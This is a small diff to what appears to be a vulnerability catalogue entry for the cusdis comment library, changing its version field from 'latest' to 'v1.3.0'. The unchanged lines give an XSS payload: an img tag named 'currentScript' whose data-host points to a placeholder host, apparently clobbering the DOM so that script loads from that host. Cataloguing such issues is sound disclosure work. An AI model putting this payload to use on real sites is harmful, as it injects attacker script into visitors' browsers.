@@ -4,7 +4,7 @@
 
 + Library: cusdis
 + Stars: 2.6K
-+ Version: latest
++ Version: v1.3.0
 + Payload: ```<img name="currentScript" data-host="https://xxx.xxx.xxx">```
 + Impact: XSS
 + CVE: N/A
